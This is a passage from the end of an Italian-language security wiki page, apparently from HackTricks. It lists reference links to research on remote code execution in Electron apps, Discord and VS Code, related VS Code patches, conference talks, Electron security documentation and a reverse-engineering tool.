- [11] [Ottenere RCE in un famoso strumento di chat giapponese con una funzionalità obsoleta di Electron](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - Esecuzione di codice remoto](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Esecuzione di codice remoto in modalità con restrizioni (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Furto con un clic di token GitHub tramite iniezione di eventi della tastiera nelle Webview di VS Code](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Problema VS Code #319593: le Webview possono attivare scorciatoie da tastiera arbitrarie nell’area di lavoro principale](https://github.com/microsoft/vscode/issues/319593)
- [16] [PR VS Code #319705: confermare l’apertura dei notebook e smettere di accettare il contesto installExtension fornito dal chiamante](https://github.com/microsoft/vscode/pull/319705)
- [17] [PR VS Code #319813: bloccare la ridistribuzione programmatica di keypress/click delle Webview nei notebook](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / estensioni per workspace locale](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: come ho hackerato ogni IDE principale in 2 settimane](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: compromettere app desktop popolari e scoprire nuove superfici di attacco in Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Sicurezza di Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [webPreferences di Electron BrowserWindow](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Reverse Engineer Anything](https://github.com/morluto/rea)
- [24] [Ricostruzione di artefatti JavaScript con REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Workflow applicativi JavaScript cross-layer con REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
